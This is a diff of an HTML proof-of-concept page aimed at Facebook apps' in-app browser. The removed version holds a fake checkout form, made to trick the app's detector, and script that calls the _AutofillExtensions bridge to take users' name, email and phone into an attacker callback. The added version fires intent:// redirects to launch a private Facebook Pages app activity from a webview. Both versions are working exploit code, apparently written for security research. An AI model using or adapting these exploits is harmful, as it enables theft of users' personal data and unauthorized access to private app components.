@@ -2,69 +2,27 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Meta Bridge Exploitation PoC</title>
-    <style>
-        body { font-family: sans-serif; padding: 20px; background: #f4f4f4; }
-        input { width: 100%; padding: 15px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 16px; }
-        button { padding: 15px; font-size: 16px; background: #1877f2; color: white; border: none; border-radius: 5px; width: 100%; margin-bottom: 10px; font-weight: bold; }
-        #log { background: #111; color: #0f0; padding: 10px; font-family: monospace; height: 200px; overflow-y: scroll; word-wrap: break-word; border-radius: 5px; margin-top: 20px; }
-    </style>
+    <title>Intent Redirection Test</title>
 </head>
 <body>
-    <h2>Checkout / Shipping</h2>
-    <p>Please enter your details below:</p>
-    
-    <!-- We need a real form so Facebook's heuristic detector sees it -->
-    <form id="checkoutForm">
-        <input type="text" id="name" name="name" autocomplete="name" placeholder="Full Name">
-        <input type="email" id="email" name="email" autocomplete="email" placeholder="Email Address">
-        <input type="tel" id="phone" name="phone" autocomplete="tel" placeholder="Phone Number">
-    </form>
-
-    <button onclick="triggerExploit()">Complete Checkout (Trigger Exploit)</button>
-    
-    <div id="log">Awaiting execution...<br></div>
+    <h2>Testing intent:// redirection</h2>
+    <button onclick="fireIntent1()">Test 1: Basic Intent</button>
+    <button onclick="fireIntent2()">Test 2: Component Intent</button>
+    <div id="log"></div>
 
     <script>
-        function log(msg) {
-            document.getElementById('log').innerHTML += msg + "<br>";
+        function log(msg) { document.getElementById('log').innerHTML += msg + "<br>"; }
+
+        function fireIntent1() {
+            log("Firing intent:// with fbinternal scheme...");
+            // Trying to hit the canary via intent scheme
+            window.location.href = "intent://pma/push_notification_settings#Intent;scheme=fbinternal;package=com.facebook.pages.app;end";
         }
 
-        window.attackerCallback = function(data) {
-            log("<span style='color:red;'><b>🚨 DATA STOLEN:</b></span><br>" + JSON.stringify(data));
-            // Autofill response usually populates the form too
-            if (data && data.data) {
-                document.getElementById('name').value = data.data.name || "";
-                document.getElementById('email').value = data.data.email || "";
-                document.getElementById('phone').value = data.data.phone || "";
-            }
-        };
-
-        function triggerExploit() {
-            if (!window._AutofillExtensions) {
-                log("Error: _AutofillExtensions not found.");
-                return;
-            }
-            
-            try {
-                let initPayload = JSON.stringify({
-                    "callbackID": "attackerCallback",
-                    "name": "attackerCallback"
-                });
-                window._AutofillExtensions.initializeCallbackHandler(initPayload);
-                
-                let requestPayload = JSON.stringify({
-                    "callbackID": "attackerCallback",
-                    "name": "attackerCallback",
-                    "request_id": "1337",
-                    "requested_fields": ["NAME", "EMAIL", "PHONE"]
-                });
-                window._AutofillExtensions.requestAutoFill(requestPayload);
-                log("Exploit executed! Look for the Facebook popup.");
-                
-            } catch (e) {
-                log("Execution Failed: " + e.message);
-            }
+        function fireIntent2() {
+            log("Firing intent:// direct to component...");
+            // Trying to directly launch a private component from the webview
+            window.location.href = "intent:#Intent;component=com.facebook.pages.app/com.facebook.pages.app.pushnotifications.settings.activity.PagesPushNotificationSettingsActivity;end";
         }
     </script>
 </body>
